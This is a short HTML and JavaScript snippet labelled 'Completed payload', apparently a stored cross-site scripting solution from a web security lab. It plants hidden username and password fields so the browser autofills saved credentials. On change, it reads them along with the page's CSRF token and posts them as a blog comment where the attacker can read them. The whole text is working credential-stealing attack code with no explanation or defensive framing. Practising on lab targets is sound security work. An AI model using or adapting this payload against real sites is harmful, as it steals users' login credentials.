<!-- Completed payload -->
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">

<script>
    function dothis() {
    var username = document.getElementsByName('username')[0].value
    var password = document.getElementsByName('password')[0].value
    var token = document.getElementsByName('csrf')[0].value
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 8); // Chenge '8' to correct postId
    data.append('comment', `${username}:${password}`);
    data.append('name', 'victim');
    data.append('email', 'blah@email.com');
    data.append('website', 'http://blah.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
    };
</script>
